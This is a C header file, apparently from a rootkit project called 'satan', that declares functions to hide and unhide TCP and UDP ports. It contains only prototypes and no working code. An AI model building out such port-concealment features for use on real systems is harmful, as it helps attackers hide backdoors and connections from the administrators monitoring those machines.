// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#ifndef SATAN_PORT_H_
#define SATAN_PORT_H_

int satan_port_init(void);
void satan_port_exit(void);

int satan_port_hide(unsigned int port_num);
int satan_port_unhide(unsigned int port_num);

int satan_port_tcp_hide(unsigned int port_num);
int satan_port_tcp_unhide(unsigned int port_num);
int satan_port_udp_hide(unsigned int port_num);
int satan_port_udp_unhide(unsigned int port_num);

#endif  // SATAN_PORT_H_
